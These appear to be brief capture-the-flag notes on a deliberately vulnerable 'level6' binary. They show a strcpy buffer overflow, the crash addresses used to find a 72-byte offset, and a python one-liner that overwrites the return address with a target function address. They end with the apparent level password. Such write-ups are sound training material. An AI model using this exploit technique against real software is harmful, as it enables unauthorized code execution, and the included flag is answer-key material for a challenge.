So this programs segfaults with no args
It doesnt read user input but rather uses launch args
It also uses strcpy which is not protected and can be used to overflow

/home/user/level6/level6 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

we get a crash at address 61616161

/home/user/level6/level6 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb

62626262

So we have the correct offset, maybe try to go to target function directly ? May not work with raw bytes 
Our target address is at 0x08048454

We can also see that the strcpy call uses an offset of 4 on the param

\x54\x84\x04\x08


$(python -c 'print( "a" * 72 + "\x54\x84\x04\x08"'))


level6@RainFall:~$ ./level6 $(python -c 'print( "a" * 72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d